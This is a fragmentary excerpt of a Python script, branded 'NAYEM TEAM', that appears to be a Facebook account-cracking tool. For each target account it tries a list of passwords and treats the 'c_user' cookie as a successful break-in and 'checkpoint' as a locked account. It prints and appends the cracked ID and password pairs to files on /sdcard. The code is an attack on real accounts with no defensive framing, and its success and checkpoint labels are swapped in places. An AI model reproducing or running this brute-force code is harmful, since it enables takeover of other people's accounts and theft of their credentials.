...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> NAYEM TEAM :\x1b[1;92m 1.1 ')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/NAYEM.txt')
				linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[NAYEM / NUSRAT] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in NAYEM:
				print('\r\r\033[1;31m[NAYEM-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/FAISAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in NAYEM:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[NAYEM-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/NAYEM-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[NAYEM / NUSRAT] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in NAYEM:
				...
				print('\r\r\033[1;32m[FAISAL-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[NAYEM-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/NAYEM.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
